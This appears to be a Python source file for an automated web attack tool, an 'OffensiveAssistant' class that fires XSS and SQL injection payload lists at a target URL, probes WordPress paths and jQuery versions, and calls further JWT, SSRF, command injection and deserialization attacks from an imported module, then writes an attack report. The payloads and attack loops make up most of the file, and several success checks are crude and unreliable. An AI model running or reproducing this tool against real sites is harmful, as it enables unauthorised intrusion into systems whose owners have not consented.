import asyncio
from typing import Dict, List, Optional
import aiohttp
from dataclasses import dataclass
import json
from bs4 import BeautifulSoup
import re
from .offensive_tools import OffensiveTools, ExploitResult

@dataclass
class AttackResult:
    success: bool
    vector: str
    details: str
    payload: str
    response: Optional[str]

class OffensiveAssistant:
    def __init__(self):
        self.session = aiohttp.ClientSession()
        self.attack_vectors = []
        self.successful_attacks = []
        self.current_target = None
        self.tools = OffensiveTools()
        
    async def execute_attack_plan(self, target_url: str, attack_recommendations: Dict) -> str:
        """Execute attacks based on recommendations."""
        self.current_target = target_url
        results = []
        
        try:
            # Standard attacks
            if "XSS" in str(attack_recommendations):
                xss_results = await self._advanced_xss_detection(target_url)
                results.extend(xss_results)
            
            if "SQL" in str(attack_recommendations):
                sqli_results = await self._advanced_sqli_detection(target_url)
                results.extend(sqli_results)
            
            # Advanced attacks
            jwt_results = await self.tools.jwt_attacks(target_url)
            if jwt_results:
                results.extend(jwt_results)
                
            traversal_results = await self.tools.directory_traversal(target_url)
            if traversal_results:
                results.extend(traversal_results)
                
            ssrf_results = await self.tools.ssrf_attacks(target_url)
            if ssrf_results:
                results.extend(ssrf_results)
                
            cmd_results = await self.tools.command_injection(target_url)
            if cmd_results:
                results.extend(cmd_results)
                
            deser_results = await self.tools.deserialization_attacks(target_url)
            if deser_results:
                results.extend(deser_results)
            
            return self._generate_attack_report(results)
            
        except Exception as e:
            return f"Attack execution failed: {str(e)}"

    async def _test_xss_vectors(self, url: str) -> AttackResult:
        """Test for XSS vulnerabilities."""
        xss_payloads = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
        
        for payload in xss_payloads:
            try:
                async with self.session.post(url, data={'input': payload}) as response:
                    content = await response.text()
                    if payload in content:
                        return AttackResult(
                            success=True,
                            vector="XSS",
                            details="Reflected XSS vulnerability found",
                            payload=payload,
                            response=content[:200]
                        )
            except Exception:
                continue
                
        return AttackResult(
            success=False,
            vector="XSS",
            details="No XSS vulnerability found",
            payload="",
            response=None
        )

    async def _test_sql_injection(self, url: str) -> AttackResult:
        """Test for SQL injection vulnerabilities."""
        sqli_payloads = [
            "' OR '1'='1",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "admin' --"
        ]
        
        for payload in sqli_payloads:
            try:
                async with self.session.get(f"{url}?id={payload}") as response:
                    content = await response.text()
                    if any(indicator in content.lower() for indicator in ['sql', 'mysql', 'sqlite']):
                        return AttackResult(
                            success=True,
                            vector="SQLi",
                            details="Potential SQL injection point found",
                            payload=payload,
                            response=content[:200]
                        )
            except Exception:
                continue
                
        return AttackResult(
            success=False,
            vector="SQLi",
            details="No SQL injection vulnerability found",
            payload="",
            response=None
        )

    async def _exploit_jquery_vulnerabilities(self, url: str) -> AttackResult:
        """Exploit jQuery-specific vulnerabilities."""
        try:
            async with self.session.get(url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                jquery_version = None
                
                for script in soup.find_all('script', src=True):
                    if 'jquery' in script['src'].lower():
                        version_match = re.search(r'jquery[.-](\d+\.\d+\.\d+)', script['src'].lower())
                        if version_match:
                            jquery_version = version_match.group(1)
                            
                if jquery_version and self._is_vulnerable_jquery(jquery_version):
                    return AttackResult(
                        success=True,
                        vector="jQuery",
                        details=f"Vulnerable jQuery version {jquery_version} detected",
                        payload=f"jQuery version: {jquery_version}",
                        response=None
                    )
                    
        except Exception as e:
            return AttackResult(
                success=False,
                vector="jQuery",
                details=f"jQuery analysis failed: {str(e)}",
                payload="",
                response=None
            )

    async def _wordpress_exploitation(self, url: str) -> AttackResult:
        """Exploit WordPress vulnerabilities."""
        wp_paths = [
            '/wp-admin/',
            '/wp-content/plugins/',
            '/wp-content/themes/',
            '/wp-json/wp/v2/users'
        ]
        
        for path in wp_paths:
            try:
                full_url = f"{url.rstrip('/')}{path}"
                async with self.session.get(full_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        if 'wp-' in content or 'WordPress' in content:
                            return AttackResult(
                                success=True,
                                vector="WordPress",
                                details=f"WordPress installation confirmed at {path}",
                                payload=f"Path: {path}",
                                response=content[:200]
                            )
            except Exception:
                continue
                
        return AttackResult(
            success=False,
            vector="WordPress",
            details="No WordPress vulnerabilities found",
            payload="",
            response=None
        )

    def _is_vulnerable_jquery(self, version: str) -> bool:
        """Check if jQuery version is vulnerable."""
        vulnerable_versions = [
            '1.9.0', '1.9.1', '1.10.0', '1.10.1',
            '1.11.0', '1.11.1', '1.12.0', '2.0.0',
            '2.1.0', '2.1.1', '2.2.0'
        ]
        return version in vulnerable_versions

    def _generate_attack_report(self, results: List[AttackResult]) -> str:
        """Generate detailed attack report."""
        successful_attacks = [r for r in results if r.success]
        failed_attacks = [r for r in results if not r.success]
        
        report = "Attack Execution Report\n" + "="*50 + "\n\n"
        
        if successful_attacks:
            report += "Successful Attacks:\n" + "-"*20 + "\n"
            for attack in successful_attacks:
                report += f"\nVector: {attack.vector}\n"
                report += f"Details: {attack.details}\n"
                report += f"Payload: {attack.payload}\n"
                if attack.response:
                    report += f"Response Preview: {attack.response[:100]}...\n"
                report += "-"*20 + "\n"
        
        if failed_attacks:
            report += "\nFailed Attacks:\n" + "-"*20 + "\n"
            for attack in failed_attacks:
                report += f"\nVector: {attack.vector}\n"
                report += f"Details: {attack.details}\n"
                report += "-"*20 + "\n"
        
        return report

    async def close(self):
        """Cleanup resources."""
        if self.session and not self.session.closed:
            await self.session.close()
        await self.tools.close()

    async def _advanced_xss_detection(self, url: str) -> List[AttackResult]:
        """Advanced XSS detection with context-aware payloads."""
        results = []
        contexts = {
            "html": [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(1)>",
            ],
            "javascript": [
                "';alert(1);//",
                "\";alert(1);//",
                "javascript:alert(1)//",
            ],
            "attribute": [
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)",
                "\" autofocus onfocus=\"alert(1)",
            ],
            "css": [
                "}</style><script>alert(1)</script>",
                "expression(alert(1))",
                "behavior:url(javascript:alert(1))",
            ]
        }
        
        for context, payloads in contexts.items():
            for payload in payloads:
                try:
                    # Test different injection points
                    injection_points = [
                        f"{url}?q={payload}",  # URL parameter
                        f"{url}#{payload}",     # Hash
                        f"{url}",               # POST body
                    ]
                    
                    for injection_point in injection_points:
                        async with self.session.get(injection_point) as response:
                            content = await response.text()
                            if self._verify_xss_success(content, payload):
                                results.append(AttackResult(
                                    success=True,
                                    vector=f"XSS ({context})",
                                    details=f"XSS vulnerability found in {context} context",
                                    payload=payload,
                                    response=content[:200]
                                ))
                except Exception:
                    continue
        
        return results

    async def _advanced_sqli_detection(self, url: str) -> List[AttackResult]:
        """Advanced SQL injection detection with error analysis."""
        results = []
        payloads = {
            "error_based": [
                "' OR '1'='1",
                "' AND 1=convert(int,@@version)--",
                "' AND 1=ctxsys.drithsx.sn(1,2)--",
                "' AND 1=dbms_pipe.receive_message('RDS',10)--",
            ],
            "boolean_based": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 'a'='a",
                "' OR 'a'='b",
            ],
            "time_based": [
                "'; WAITFOR DELAY '0:0:5'--",
                "'; SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
            ]
        }
        
        for technique, technique_payloads in payloads.items():
            for payload in technique_payloads:
                try:
                    start_time = asyncio.get_event_loop().time()
                    async with self.session.get(f"{url}?id={payload}") as response:
                        content = await response.text()
                        elapsed = asyncio.get_event_loop().time() - start_time
                        
                        if self._verify_sqli_success(content, technique, elapsed):
                            results.append(AttackResult(
                                success=True,
                                vector=f"SQLi ({technique})",
                                details=f"SQL injection vulnerability found using {technique}",
                                payload=payload,
                                response=content[:200]
                            ))
                except Exception:
                    continue
        
        return results

    def _verify_xss_success(self, content: str, payload: str) -> bool:
        """Verify if XSS payload was successful."""
        # Check if payload is reflected without encoding
        if payload in content:
            return True
        
        # Check for successful script execution markers
        success_markers = [
            "alert(1)",
            "onload=",
            "onerror=",
            "javascript:",
        ]
        return any(marker in content for marker in success_markers)

    def _verify_sqli_success(self, content: str, technique: str, elapsed: float) -> bool:
        """Verify if SQL injection was successful."""
        if technique == "error_based":
            error_patterns = [
                "SQL syntax",
                "mysql_fetch",
                "ORA-01756",
                "SQL Server",
                "PostgreSQL",
            ]
            return any(pattern.lower() in content.lower() for pattern in error_patterns)
            
        elif technique == "boolean_based":
            # Compare response lengths or specific content differences
            return len(content) > 4096  # Arbitrary threshold
            
        elif technique == "time_based":
            # Check if response took longer than expected
            return elapsed >= 5  # 5 seconds delay
            
        return False